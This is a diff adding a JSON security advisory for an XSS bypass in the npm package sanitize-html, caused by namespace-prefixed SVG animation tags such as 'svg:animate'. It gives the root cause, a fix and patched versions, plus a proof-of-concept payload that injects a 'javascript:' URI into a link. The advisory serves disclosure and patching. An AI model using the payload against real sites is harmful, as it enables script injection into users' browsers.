@@ -1,0 +1,59 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2026-10-20T18:21:20Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "sanitize-html"
+  },
+  "Advisory": {
+    "DatabaseId": 518043,
+    "Id": "GSA_kwCzR0hTQS0zNzRmLTdjaGotOTk0OM4AB-eb",
+    "GhsaId": "GHSA-374f-7chj-9948",
+    "References": [
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-374f-7chj-9948"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.18.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-374f-7chj-9948"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-374f-7chj-9948"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-113657"
+      }
+    ],
+    "Description": "## Summary\n\nsanitize-html 2.17.7 introduced `animatesUrlAttribute()` to block SVG animation elements (`animate`, `animateColor`, `animateMotion`, `animateTransform`, `set`) when their `attributeName` targets a URL sink like `href`. However, this check is bypassed when the animation element uses a namespace prefix (e.g., `svg:animate` instead of `animate`).\n\n## Root Cause\n\nThe `animatesUrlAttribute` function (index.js, line ~832) checks `svgAnimationTags.indexOf(name.toLowerCase())`, where `svgAnimationTags` contains bare local names: `[\"animate\", \"animatecolor\", \"animatemotion\", \"animatetransform\", \"set\"]`. htmlparser2 passes namespace-prefixed tag names verbatim, so `svg:animate` does not match `animate` in the array, causing the function to return `false` and skip the SMIL XSS protection.\n\nIronically, the function already handles namespace prefixes correctly for the `attributeName` target value (line ~843): `const localName = target.slice(target.lastIndexOf(\":\") + 1)` — but this same stripping was not applied to the tag name itself.\n\n## Proof of Concept\n\n```javascript\nconst sanitizeHtml = require(\"sanitize-html\");\n\nconst config = {\n  allowedTags: false,\n  allowedAttributes: false,\n  allowedSchemes: [\"http\", \"https\"]\n};\n\n// Standard animate — BLOCKED by 2.17.7 fix\nconst blocked = sanitizeHtml(\n  `\u003csvg\u003e\u003ca href=\"#safe\"\u003e\u003canimate attributeName=\"href\" values=\"#safe;javascript:alert(1)\" dur=\".01s\" fill=\"freeze\"/\u003e\u003ctext\u003eClick\u003c/text\u003e\u003c/a\u003e\u003c/svg\u003e`,\n  config\n);\nconsole.log(\"Standard animate:\", blocked.includes(\"javascript:\") ? \"BYPASS\" : \"BLOCKED\");\n// Output: BLOCKED\n\n// Namespace-prefixed animate — BYPASSES the fix\nconst bypassed = sanitizeHtml(\n  `\u003csvg\u003e\u003ca href=\"#safe\"\u003e\u003csvg:animate attributeName=\"href\" values=\"#safe;javascript:alert(document.domain)\" dur=\".01s\" fill=\"freeze\"/\u003e\u003ctext\u003eClick\u003c/text\u003e\u003c/a\u003e\u003c/svg\u003e`,\n  config\n);\nconsole.log(\"svg:animate:\", bypassed.includes(\"javascript:\") ? \"BYPASS\" : \"BLOCKED\");\n// Output: BYPASS\n```\n\nAll 5 SMIL animation elements are bypassable with any namespace prefix (`svg:`, `xlink:`, `xml:`, uppercase variants). Tested and confirmed on sanitize-html 2.17.7 from the apostrophe monorepo.\n\n## Impact\n\nCross-site scripting (XSS) via SMIL animation retargeting. When an application uses `allowedTags: false` (common in rich-text editors that want to preserve SVG), an attacker can inject `\u003csvg:animate attributeName=\"href\" values=\"#safe;javascript:...\" .../\u003e` to override the `href` attribute of a parent `\u003ca\u003e` element after the page loads, causing the link to execute JavaScript when clicked.\n\n## Suggested Fix\n\nStrip the namespace prefix from the tag name before the lookup, matching the pattern already used for the attribute name target:\n\n```javascript\n// Before (vulnerable):\nif (svgAnimationTags.indexOf(name.toLowerCase()) === -1) {\n\n// After (fixed):\nconst localTagName = name.toLowerCase().slice(name.lastIndexOf(\":\") + 1);\nif (svgAnimationTags.indexOf(localTagName) === -1) {\n```\n\n## Affected Versions\n\nsanitize-html \u003e= 2.17.7 (where the SMIL animation protection was introduced). Earlier versions lack the SMIL protection entirely.\n\n## Credit\n\nKai Aizen (SnailSploit) — Adversarial AI \u0026 Security Research",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-20T18:21:19Z",
+    "Severity": "LOW",
+    "Summary": "ApostropheCMS sanitize-html: SMIL animation namespace-prefix bypass allows javascript: URI injection (XSS)",
+    "UpdatedAt": "2026-10-20T18:21:20Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 3.7,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.18.0"
+      },
+      "VulnerableVersionRange": "\u003e= 2.17.7, \u003c 2.18.0"
+    }
+  ]
+}
